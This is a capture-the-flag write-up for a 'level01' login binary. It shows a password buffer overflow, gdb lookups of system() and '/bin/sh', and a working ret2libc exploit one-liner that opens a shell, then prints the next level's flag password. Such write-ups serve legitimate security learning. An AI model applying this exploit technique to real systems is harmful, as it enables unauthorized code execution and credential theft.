# Write up

We easily find the right Username.

The password can segfault if overflow : 
```
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
nope, incorrect password...

Segmentation fault (core dumped)
```

The stored password in .rodata is admin, however we still get the wrong password message.
```
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...

```
Obviously this message is hardcoded in anycase, it would be too easy if not. :)

NX is disabled here, so let's try a ret2libc
(We get a segfault for a 80 byte long password buffer)
```
(gdb) print &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

$ (python -c 'print "dat_wil"'; python -c 'print "b" * 80 + "\xd0\xae\xe6\xf7" + "LIDL" + "\xec\x97\xf8\xf7"'; cat) | ./level01
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
Which gives us our shell.


